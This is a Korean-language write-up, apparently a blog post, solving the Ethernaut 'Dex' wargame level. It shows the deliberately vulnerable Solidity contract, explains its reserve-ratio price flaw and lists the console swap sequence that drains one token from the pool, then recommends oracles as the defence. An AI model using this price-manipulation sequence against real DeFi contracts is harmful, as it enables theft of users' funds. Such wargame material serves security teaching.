https://teberr.notion.site/Ethernaut-Dex-9fa02a4961e34edf80f9d53011ac6087

![dex.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a74dd818-4d7e-4926-bd7d-400c6e93394e/dex.png)

> 이 문제의 목표는 가격 조작을 통해 기초적인 DEX 컨트랙트를 해킹하고 자산을 빼내는 것입니다.

token1과 token2를 각각 10개씩 가지고 시작하며 DEX 컨트랙트에는 각 토큰이 100개씩 존재하고 있습니다.

컨트랙트에서 token1이나 token2 둘 중 하나를 전부 탈취하고 컨트랙트가 비정상적인 가격을 반환하도록 해주세요.

원래는 swap을 위해 먼저 DEX에 ERC20토큰을 approve를 해주어야 합니다. 그래야지만 DEX에서 trasnferFrom 함수를 이용해 토큰을 전송하고 스왑할 수 있기 때문입니다. 이 문제에서는 편의성을 위하여 각 ERC20 토큰의 주소를 통한 것이 아닌 컨트랙트에 approve 함수를 구현하여 한번에 approve를 할 수 있도록 하였습니다.

힌트
- 토큰 가격이 어떻게 결정되는지 알아봅시다.
- swap 함수가 어떻게 작동하는지 살펴봅시다.
- approve 함수는 어떤 함수인지 알아봅시다.
- 컨트랙트와 상호작용하는 다른 방법도 생각해봅시다.
> 

 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

# 코드 분석 및 공격 설계

이번 문제는 문제에서도 대놓고 이야기 했듯이 가격 조작이 핵심이다.

가격 조작은 보통 가격을 조작하여 이득을 볼 수 있도록 가격 결정이 허술하게 일어나기 때문인데 이를 위해서 위 DEX 컨트랙트의 가격 결정 부분 코드를 살펴보자.

```solidity
  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }
```

위 함수는 from 토큰에서 to 토큰으로 amount 만큼 교환하고자 할때 최종적으로 가져갈 to 토큰의 개수를 의미한다.

이를 조금 더 보기 쉽게 token1을 token2로 변경한다고 가정하면 다음과 같이 된다.

```solidity
**사용자가 받을 token2의 양 = 바꿀 token1의 양  * DEX에 있는 token2 / DEX에 있는 token1** 
```

즉 식을 바꾸면 아래와 같다.

```solidity
**사용자가 받을 token2의 양 * DEX에 있는 token1  = 바꿀 token1의 양  * DEX에 있는 token2** 
```

사용자가 받을 token2의 양과 DEX에 있는 token1의 곱이 사용자가 넣을 token1의 양과 DEX에 있는 token2의 곱과 같아야 한다는 식이다.

현재 DEX에 token1이 100개 씩있어서 token1 100개는 token2 100개와 같은 가치를 가지고 있다고 계산이 된다. 

이 함수의 문제는 직접 토큰 10개를 swap 해보면 느낄 수 있다.

token1 10개를 token2로 스왑한다고 가정해보자. DEX에는 각각 100개씩 있으므로 사용자가 받을 token2의 양은

```solidity
**사용자가 받을 token2의 양 = 10 * 100 / 100 = 10**
```

총 10개가 된다. 

그러면 이제 사용자는 token2를 20개 가지고 있기 때문에 이 token2를 다시 token1으로 20개를 스왑하면 몇개의 token1을 받을 수 있을지 계산해보자. DEX에는 token1이 110개 token2가 90개 있다. 이 DEX에서는 token2 90개가 token1 110개와 같은 가치로 계산하게 된다.

```solidity
사용자가 받을 token1의 양 = 바꿀 token2의 양 * DEX에 있는 token1 / DEX에 있는 token2
=> 사용자가 받을 token1의 양 = 20 * 110 / 90 = 24 
```

DEX에 있는 token1의 양은 이전 스왑으로 인해 증가했고 DEX에 있는 token2의 양은 이전 스왑으로 인해 감소했으므로 기존 교환 비였던 1:1보다 더 좋은 교환비로 총 24개의 token1을 가질 수 있게 된다.  

즉 내가 바꾸고자 하는 from의 토큰이 DEX에서 적게 있고 받을 토큰인 to 토큰이 DEX에서 증가한 상태라면 내 from 토큰의 가치가 상승한 상태로 to 토큰으로 교환할 수 있게 된다. 

이는 사실 크게 이상한 식은 아니다. DEX에 적게 존재하는 토큰이 DEX에 많이 존재하는 토큰보다 가치가 높은건 평범한 상태이니까 하지만 중요한 건 내가 기존에 스왑을 통해 변환했던 양보다 훨씬 많이 가져올 수 있다는 것이다.

이를 반복적으로 이용하여 DEX에 있는 토큰을 전부 탈취할 수 있다. 

# 공격

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/14eda1e4-b4f4-4fd0-8aa8-1ca1fc52af66/Untitled.png)

먼저 총 100개 이상의 스왑을 할 일은 없으므로 (110개 가져오면 문제 조건 해결) 먼저 approve를 이용하여 스왑하는데 불편함이 없도록 해놓자.

그리고 이제 스왑을 진행하면 된다.

```solidity
await contract.swap(await contract.token1(),await contract.token2(),10)
-> token2 10개 획득하여 player는 token1 0개 token2 20개 소유
await contract.swap(await contract.token2(),await contract.token1(),20)
-> token1 24개 획득하여 player는 token1 24개 token2 0개 소유
await contract.swap(await contract.token1(),await contract.token2(),24)
-> token2 30개 획득하여 player는 token1 0개 token2 30개 소유
await contract.swap(await contract.token2(),await contract.token1(),30)
-> token1 41개 획득하여 player는 token1 41개 token2 0개 소유
await contract.swap(await contract.token1(),await contract.token2(),41)
-> token2 65개 획득하여 player는 token1 0개 token2 65개 소유

(await contract.getSwapPrice(await contract.token2(),await contract.token1(),65)).toNumber()
158

```

player가 token1 0개 token2를 65개 소유한 시점에서 token2를 전부 스왑하면 얻을 수 있는 token1의 개수는 158개가 나온다. 하지만 DEX에 있는 token1의 개수는 총 110개이므로 110개 보다 많이 탈취할 수는 없다. 따라서 token1을 110개만 얻기 위해서는 token2를 몇개 스왑해야 하는지 계산해보자.

현재 DEX에는 token1 110개 token2 45개가 존재하므로 이를 이용해 계산하면 된다.

```solidity
사용자가 받을 token1의 양 = 바꿀 token2의 양 * DEX에 존재하는 token1의 양 / DEX에 존재하는 token2의 양 
110 = amount * 110  / 45
amount = 45
```

즉 token2 45개가 token1 110개와 같은 교환비를 갖게 된다.  token2 45개만 스왑해도 token1을 110개 얻을 수 있다.

```solidity
(await contract.getSwapPrice(await contract.token2(),await contract.token1(),45)).toNumber()
110
```

검증해보면 실제로 45개를 스왑하면 110개를 얻을 수 있다고 나온다.

```solidity
await contract.swap(await contract.token1(),await contract.token2(),45)
-> token1 110개 획득하여 player는 token1 110개 token2 20개 소유
(await contract.balanceOf(await contract.token1(),player)).toNumber()
-> 110
(await contract.balanceOf(await contract.token2(),player)).toNumber()
-> 20
```

가지고 있던 token1 10개 token2 10개를 몇번의 스왑을 통하여 token1 110개 token2 20개로 증가시켰다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4d425c98-357e-4394-9d31-8f20cb634a0c/Untitled.png)

인스턴스를 제출하면 문제를 해결했음을 확인할 수 있다.

# 후기

스마트 컨트랙트에서 가격이나 데이터에 관해서 정보를 얻을 수 있다는 것은 취약한 공격벡터에 해당한다. 

특히 DEX의 경우 거래소 자체는 탈중앙화 되어있지만 가격이 DEX 하나의 공식을 통해서 결정될 경우 이를 조작했을 시에 큰 문제가 생길 수 있다.

따라서 이러한 위험을 피하기 위해서는 다양한 독립적인 곳에서 부터 가격을 참조하여 결정해야 하며 이것이 바로 오라클이다. 

[체인링크 데이터 피드](https://docs.chain.link/data-feeds/price-feeds)는 스마트 컨트랙트로 신뢰할 수 있는 데이터를 가져올 수 있는 안전한 방법이다. [안전한 랜덤성](https://docs.chain.link/vrf/v2/introduction), [API 호출 기능](https://docs.chain.link/any-api/get-request/introduction), [모듈 오라클 네트워크,](https://docs.chain.link/architecture-overview/architecture-decentralized-model) [유지, 조치 및 관리](https://docs.chain.link/chainlink-automation/introduction) 등을 제공한다.

Uniswap의 TWAP 오라클은 시간 가중 모델인 TWAP을 사용한다. 이 디자인은 매력적이지만(일시적인 가격조작이 시간 가중으로 인해 상쇄되기 때문)이 프로토콜은 DEX의 유동성에 큰 영향을 받는다. 따라서 유동성이 낮으면 쉽게 가격 조작이 가능해진다.
